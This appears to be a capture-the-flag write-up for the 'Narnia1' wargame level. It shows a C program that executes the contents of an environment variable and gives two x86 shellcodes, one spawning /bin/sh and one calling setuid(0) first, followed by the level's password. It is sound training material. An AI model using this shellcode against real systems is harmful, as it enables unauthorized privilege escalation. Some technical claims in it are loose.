# Narnia1

```C
#include <stdio.h>

int main(){
  int (*ret)();

  if(getenv("EGG")==NULL){    
  	printf("Give me something to execute at the env-variable EGG\n");
  	exit(1);
  }

  printf("Trying to execute EGG!\n");
  ret = getenv("EGG");
  ret();

  return 0;
}
```
The C code here seems to use the  function `getenv()` to get the function pointer at the environmental variable `EGG`. (Also as a challenge what happens if we do not set EGG?)

So lets make an environmental variable. To do that do:

```
$ export EGG="dogs_are_cool"
$ echo $EGG
dogs_are_cool
```

Now we need to set as a function. However you can't make and compile a C program because to much overhead and can be complicated in referring the address of the C function. We need `SHELLCODE`. Shellcode is x86 assembly code that when compiled and given as input will spawn a shell for our use.

So lets create a simple shellcode program `shellcode.s`. Need `.s` extension so `nasm` compiles it as a lightweight machine code instead of an executable.

So the basic shellcode is:
```assembly
global _start
section .text
_start:
    ;execve("/bin/sh",0,0)
    xor ecx,ecx
    push ecx
    push 0x68732f6e
    push 0x69622f2f
    lea eax,[ecx+0x0B]
    mov ebx,esp
    int 0x80
```

```assembly
global _start
section .text
_start:
    ;setuid(0)
    xor ebx,ebx
    lea eax,[ebx+0x17]
    cdq
    int 0x80
    ;execve("/bin/sh",0,0)
    xor ecx,ecx
    push ecx
    push 0x68732f6e
    push 0x69622f2f
    lea eax,[ecx+0x0B]
    mov ebx,esp
    int 0x80
```

Password: `nairiepecu`
